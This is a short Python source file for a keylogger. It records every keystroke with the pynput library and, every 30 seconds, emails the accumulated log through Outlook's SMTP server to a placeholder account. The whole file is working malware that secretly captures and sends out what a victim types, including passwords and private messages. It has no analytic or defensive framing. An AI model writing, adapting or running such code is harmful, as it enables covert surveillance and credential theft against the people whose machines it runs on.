import pynput.keyboard
import smtplib
import threading

log = ""

def CallbackFunction(key):
    global log
    try:
        log = log + str(key.char)
    except AttributeError:
        if key == key.space:
            log = log + " "
        else:
            log = log + str(key)
    except:
        pass

    print(log)

def SendEmail(email, password, message):
    email_server = smtplib.SMTP("smtp-mail.outlook.com", 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, message)
    email_server.quit()

# Threading
def ThreadFunction():
    global log
    SendEmail("user@outlook.com", "password", log.encode('utf-8'))
    log = ""
    timer_object = threading.Timer(30, ThreadFunction)
    timer_object.start()

keylogger_listener = pynput.keyboard.Listener(on_press=CallbackFunction)

with keylogger_listener:
    ThreadFunction()
    keylogger_listener.join()
